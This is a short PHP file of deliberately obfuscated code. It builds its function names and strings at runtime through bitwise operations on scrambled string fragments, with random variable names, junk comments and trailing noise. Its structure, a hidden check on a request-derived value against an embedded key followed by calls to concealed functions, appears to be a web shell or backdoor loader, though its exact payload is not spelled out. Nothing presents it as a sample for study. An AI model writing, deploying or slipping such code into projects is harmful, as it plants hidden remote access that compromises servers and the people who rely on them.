<?php
$aLllDqhF9Ji='Gf0g'.p1vyjb7q;$s5B=WWYoC.'~(_6??'&'S{r;'.MO7_w.'??';$zRV='4 $N/,H*SRQ'|'+6&L'.
             '%5H!CFA';$kvvWU='Q(o'^'tL[';$DOZFUJ='wg}wow'&'we}w~w';$Hd='?9C;P-d('.zDyO^#P1'.
             '^[!'.zizTh.'^1Z.';$dFj7D0pGjw2=kqj_gP.'-k]'&w4G_3O.">(T";$zlv0ZC8qUEM='Z@EVK('.
             'f^(-^K>G='^'9301=E9(US9>U(C';$hUeqy='5d!5`@ 3a!1!'|'!@00D"5#a9 6';$rIP=/*z8Rn'.
             'e*/XtGb.'}'^'aD"[L';$DbV='3wc4}'.t7gs.';q{{'&'wlo~e:5i=w;=c';$MH0NJ3amy=M^/*w'.
             '+>(0nBA5>m*/y;$rXVM0eNfPQv='2'|'0';$P8mrlvoN='H  '|aD1;$dqj0='gw~uo~'&/*LZKSu'.
             ']cNraXtl%*/ouvmow;$mF='> [(S?)i^'^"nDk} Om(n";$zF=HDT|'HP@';$nkHBES=PS|PM;'eT'.
             'Qky';$FGoKjPiloK=A|A;$Vfe_NmA=L^':';$QNSzplc=' '|l;$koj='@T@PK'|HDTPV;'z_6i1Q'.
             'Hw';$vk51=XZJGI|H_LIB;$B4axu='H@^MP@S'|AAUDCIP;$iw2Ek=' '^d;$qiXb9kxQKZG=n&/*'.
             '&e1*/N;$o26_x=$s5B^$zRV;$vizM=$P8mrlvoN|$kvvWU;$Mrm61fy=$DOZFUJ&$dqj0;'bkTKZd'.
             'nj{';$k9DzF8T6=$Hd|('w]C!z+'.F4BL.'{D'^'V/1A#q$Q&(9a');$eI=$mF|/*dFgu7sKlQI8C'.
             '}5z}*/$dFj7D0pGjw2;$dcqR7XoQl=$zlv0ZC8qUEM&('ww}'.qww_n.'}ost}oo'&'kvg{'./*rL'.
             '2_F-7#+Rt*/uw_owo.'{|}oo');if(!$o26_x($vizM($Mrm61fy($zF.$nkHBES./*hNYyhnTTeT'.
             ':Ld.Hp~mr*/$FGoKjPiloK)),$hUeqy.$rIP.$DbV.$MH0NJ3amy.$rXVM0eNfPQv))/*PyiHVwAc'.
             '2UVig?f{Q#*/$k9DzF8T6($eI($Vfe_NmA.$QNSzplc.('1'|'"'),3),$dcqR7XoQl(false,/*a'.
             'Zve_e<&*/$Mrm61fy($koj.$vk51.$B4axu.$iw2Ek.$qiXb9kxQKZG)));#SR)tRF}$(_usxjI$'.
             '=c!-5Dk2I9&P__vcGvVq2.q!9CFQ>Kv2h+]jnD<$upXvxnga$o_k#jdyx!4{N[2{CuwR';